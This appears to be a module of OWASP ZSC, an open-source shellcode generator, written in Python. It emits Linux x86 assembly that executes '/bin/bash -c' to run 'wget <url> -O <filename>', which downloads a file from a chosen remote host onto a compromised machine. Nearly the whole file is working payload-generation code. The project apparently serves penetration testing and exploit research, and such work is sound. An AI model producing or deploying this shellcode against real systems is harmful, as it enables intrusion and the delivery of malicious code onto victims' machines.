#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
'''
from core import stack
from lib.opcoder.linux_x86 import convert
def sys(command):
	return '''push   $0xb
pop    %%eax
cltd
push   %%edx
%s
mov    %%esp,%%esi
push   %%edx
push   $0x632d9090
pop    %%ecx
shr    $0x10,%%ecx
push   %%ecx
mov    %%esp,%%ecx
push   %%edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %%esp,%%ebx
push   %%edx
push   %%edi
push   %%esi
push   %%ecx
push   %%ebx
mov    %%esp,%%ecx
int    $0x80
'''%(str(command))
def run(data):
	url,filename=data[0],data[1]
	command = 'wget %s -O %s' %(str(url),str(filename)) 
	return sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))